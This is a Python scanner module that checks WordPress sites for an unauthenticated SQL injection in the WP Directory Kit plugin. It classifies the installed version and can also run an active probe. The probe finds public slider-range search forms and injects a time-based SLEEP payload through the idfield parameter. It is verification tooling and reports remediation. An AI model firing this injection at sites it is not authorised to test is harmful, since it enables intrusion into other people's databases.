from __future__ import annotations

import re
import time
import urllib.parse
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2026-109197"
NAME = "WP Directory Kit unauthenticated SQL injection via idfield"
COMPONENT = "WordPress plugin WP Directory Kit"
AFFECTED_RULE = "WP Directory Kit 0 through 1.6.0; fixed in 1.6.1"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
PLUGIN_SLUG = "wpdirectorykit"

FIELD_ID_RE = re.compile(r"wdk_field_id_(\d+)")
FIELD_INPUT_RE = re.compile(r'name=["\']field_(\d+)_min["\']', re.IGNORECASE)
DATA_MAX_RE = re.compile(r'data-max=["\']([^"\']*)["\']', re.IGNORECASE)
LINK_RE = re.compile(r'href=["\']([^"\']+)["\']', re.IGNORECASE)

COMMON_PATHS = (
    "/",
    "/search/",
    "/listings/",
    "/results/",
    "/properties/",
    "/directory/",
    "/wdk-search/",
)

# The dynamic column is field_<idfield>_<field_type>. A slider range is usually
# backed by a NUMBER field, so that is tried first; the rest cover custom
# search forms that reuse a different field type.
FIELD_TYPES = (
    "NUMBER",
    "INPUTBOX",
    "DROPDOWN",
    "TEXTAREA",
    "CHECKBOX",
    "RADIO",
    "DATE",
    "DATETIME",
    "COLOR",
    "MAP",
    "USERS",
    "LISTING",
    "STARS",
    "FILEUPLOAD",
    "UPLOAD",
    "DROPDOWNMULTIPLE",
    "CHECKBOX_MULTIPLE",
)


def _classify(version: str | None) -> str:
    if not version:
        return "DETECTED_VERSION_UNKNOWN"
    try:
        parts = tuple(int(part) for part in version.split(".")[:3])
    except ValueError:
        return "DETECTED_VERSION_UNKNOWN"
    if len(parts) < 3:
        parts = parts + (0,) * (3 - len(parts))
    return "LIKELY_VULNERABLE" if parts <= (1, 6, 0) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=_classify,
        remediation="Upgrade WP Directory Kit to 1.6.1 or newer.",
        exploit_available=True,
    )


def _slider_fields(html: str) -> list[tuple[str, str]]:
    """Return (field_id, data-max) pairs for rendered slider-range fields."""
    if "SLIDER_RANGE" not in html and "wdk-slider-range" not in html:
        return []
    fields: list[tuple[str, str]] = []
    seen: set[str] = set()
    for match in FIELD_INPUT_RE.finditer(html):
        field_id = match.group(1)
        if field_id in seen:
            continue
        prefix = html[max(0, match.start() - 2500) : match.start()]
        max_matches = list(DATA_MAX_RE.finditer(prefix))
        data_max = max_matches[-1].group(1) if max_matches else ""
        fields.append((field_id, data_max))
        seen.add(field_id)
    if fields:
        return fields
    for match in FIELD_ID_RE.finditer(html):
        field_id = match.group(1)
        if field_id in seen:
            continue
        window = html[match.start() : match.start() + 2500]
        max_match = DATA_MAX_RE.search(window)
        fields.append((field_id, max_match.group(1) if max_match else ""))
        seen.add(field_id)
    return fields


def _candidate_types(data_max: str) -> tuple[str, ...]:
    value = (data_max or "").strip()
    ordered: tuple[str, ...]
    if re.fullmatch(r"\d{4}-\d{2}-\d{2}(?:[ T].*)?", value):
        ordered = ("DATE", "DATETIME")
    elif re.fullmatch(r"-?\d+(?:\.\d+)?", value):
        ordered = ("NUMBER", "INPUTBOX", "DROPDOWN")
    else:
        ordered = ("NUMBER", "INPUTBOX", "TEXTAREA", "DROPDOWN")
    return tuple(dict.fromkeys((*ordered, *FIELD_TYPES)))


def _candidate_urls(base: str, home_html: str) -> list[str]:
    urls = [f"{base}{path}" for path in COMMON_PATHS]
    base_netloc = urllib.parse.urlsplit(base).netloc
    for href in LINK_RE.findall(home_html):
        absolute = urllib.parse.urljoin(f"{base}/", href)
        parsed = urllib.parse.urlsplit(absolute)
        if parsed.scheme not in {"http", "https"} or parsed.netloc != base_netloc:
            continue
        clean = urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, parsed.path, "", ""))
        if clean not in urls:
            urls.append(clean)
        if len(urls) >= 40:
            break
    return urls


def _discover_slider_pages(
    client: HttpClient, base: str, timeout: int
) -> list[tuple[str, str, str]]:
    home = client.get(f"{base}/", timeout=timeout)
    home_html = "" if is_transport_error(home) else str(home.get("body") or "")
    found: list[tuple[str, str, str]] = []
    seen: set[tuple[str, str]] = set()
    for url in _candidate_urls(base, home_html):
        response = client.get(url, timeout=timeout)
        if is_transport_error(response) or response.get("status") != 200:
            continue
        final_url = str(response.get("final_url") or url)
        for field_id, data_max in _slider_fields(str(response.get("body") or "")):
            # The same search form is often embedded on several pages. Test
            # each field configuration once, not once per page.
            key = (field_id, data_max)
            if key in seen:
                continue
            seen.add(key)
            found.append((final_url, field_id, data_max))
    return found


def _baseline(client: HttpClient, page_url: str, timeout: int) -> tuple[float, dict[str, Any]]:
    start = time.perf_counter()
    response = client.post(page_url, data={}, timeout=timeout)
    return time.perf_counter() - start, response


def _timing_request(
    client: HttpClient,
    page_url: str,
    field_id: str,
    field_type: str,
    delay: int,
    timeout: int,
) -> tuple[float, dict[str, Any], str]:
    payload = f"{field_id}_{field_type}+(SELECT SLEEP({delay}))-- -"
    start = time.perf_counter()
    response = client.post(
        page_url,
        data={"idfield": payload},
        timeout=max(timeout, delay * 12 + 10),
    )
    return time.perf_counter() - start, response, payload


def run_timing_probe(
    target_url: str,
    delay: int = 1,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Find a public slider-range search form and inject SLEEP through idfield."""
    base = normalize_url(target_url).rstrip("/")
    client = HttpClient(timeout=timeout, proxy=proxy)
    pages = _discover_slider_pages(client, base, timeout)
    if not pages:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=base,
            detail=(
                "No public WP Directory Kit slider-range search form was found; "
                "the ORDER BY probe was not sent."
            ),
            action="Publish a WP Directory Kit search form with a slider-range field and retry.",
        )

    best: dict[str, Any] | None = None
    tested: list[str] = []
    for page_url, field_id, data_max in pages:
        baseline, baseline_response = _baseline(client, page_url, timeout)
        if is_transport_error(baseline_response):
            if best is None:
                best = {
                    "page": page_url,
                    "transport": transport_error_detail(baseline_response),
                }
            continue
        for field_type in _candidate_types(data_max):
            tested.append(f"{field_id}_{field_type}")
            elapsed, response, payload = _timing_request(
                client, page_url, field_id, field_type, delay, timeout
            )
            if is_transport_error(response):
                continue
            evidence = {
                "page": page_url,
                "field_id": field_id,
                "field_type": field_type,
                "delay_seconds": delay,
                "baseline_seconds": round(baseline, 3),
                "payload_seconds": round(elapsed, 3),
                "payload": payload,
                "data_max": data_max,
                "tested_types": len(tested),
            }
            if elapsed >= delay * 0.8 and (elapsed - baseline) >= delay * 0.6:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE",
                    confidence="CONFIRMED",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=True,
                    exploit_ran=True,
                    proof_url=page_url,
                    evidence=evidence,
                    detail=(
                        f"The idfield parameter moved the field id out of the ORDER BY "
                        f"identifier and SLEEP({delay}) delayed the page by "
                        f"{elapsed - baseline:.2f}s over the baseline. The probe is "
                        "time-based and does not extract data."
                    ),
                    action="Upgrade WP Directory Kit to 1.6.1 or newer.",
                )
            if best is None:
                best = evidence

    if best and best.get("transport"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=best.get("page"),
            detail=f"The baseline request failed in transit ({best['transport']}).",
            action="Retry when the target is reachable.",
        )

    final_evidence = dict(best or {})
    final_evidence["tested_types"] = len(tested)
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=best.get("page") if best else base,
        evidence=final_evidence,
        detail=(
            "The slider-range search form rendered but no candidate field type "
            "produced the expected ORDER BY delay; the build may be patched, "
            "cached, or the slider max may be fixed."
        ),
        action="Confirm the installed WP Directory Kit version and the search form field type.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    result = run_timing_probe(target_url, delay=1, timeout=timeout, proxy=proxy)
    result.detail += " Safe mode uses a 1-second timing check; aggressive mode uses 3 seconds."
    return result


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    return run_timing_probe(target_url, delay=3, timeout=timeout, proxy=proxy)


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del cms_version, aggressive_command, aggressive_args, kwargs
    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        return run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    return run_safe_probe(target_url, timeout=timeout, proxy=proxy)


def cleanup(
    target_url: str,
    *,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> dict[str, Any]:
    del target_url, timeout, proxy, aggressive_args, aggressive_command
    return {
        "removed": [],
        "remaining": [],
        "manual": [],
        "detail": "The timing probe leaves no media or database rows; no cleanup is required.",
    }


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["0-1.6.0"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-21",
        "updated": "2026-11-21",
        "required_detectors": [PLUGIN_SLUG],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-109197",
            "https://www.wordfence.com/threat-intel/vulnerabilities/id/73ecfe84-dbe1-4e89-959b-e810d9a436f6",
            "https://plugins.trac.wordpress.org/browser/wpdirectorykit/trunk/application/views/search_fields/SLIDER_RANGE.php#L67",
            "https://plugins.trac.wordpress.org/browser/wpdirectorykit/trunk/vendor/Winter_MVC/core/database.php#L441",
            "https://plugins.trac.wordpress.org/browser/wpdirectorykit/trunk/vendor/Winter_MVC/core/helpers.php#L770",
            "https://wordpress.org/plugins/wpdirectorykit/",
        ],
    }
